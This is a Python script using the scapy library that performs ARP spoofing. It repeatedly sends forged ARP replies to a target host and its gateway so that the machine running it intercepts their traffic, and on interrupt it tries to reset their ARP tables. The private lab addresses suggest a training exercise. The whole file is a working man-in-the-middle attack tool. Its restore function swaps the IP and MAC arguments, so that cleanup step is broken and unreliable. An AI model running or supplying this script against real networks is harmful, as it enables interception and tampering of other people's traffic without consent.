#!/usr/bin/env python

import scapy.all as scapy
import time
# import sys  for python 2.7

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, router_ip):
    target_mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    scapy.send(packet, verbose=False)

def restore(west_ip, gateway_ip):
    destination_mac = get_target_mac(west_ip)
    source_mac = get_target_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=destination_mac, hwdst=west_ip, psrc=gateway_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.11"
gateway_ip = "10.0.2.1"

try:
    packet_counter = 0
    while True:
        packet_counter = packet_counter + 2
        print("\r[+]Packet sent : " + str(packet_counter) + " press Ctrl C to quit  ", end="")
        # sys.stdout.flush()    for python 2.7
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\ndetected control C ........ resetting arp tables and Quiting!!!!\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    # restore("10.0.2.1", "10.0.2.11")

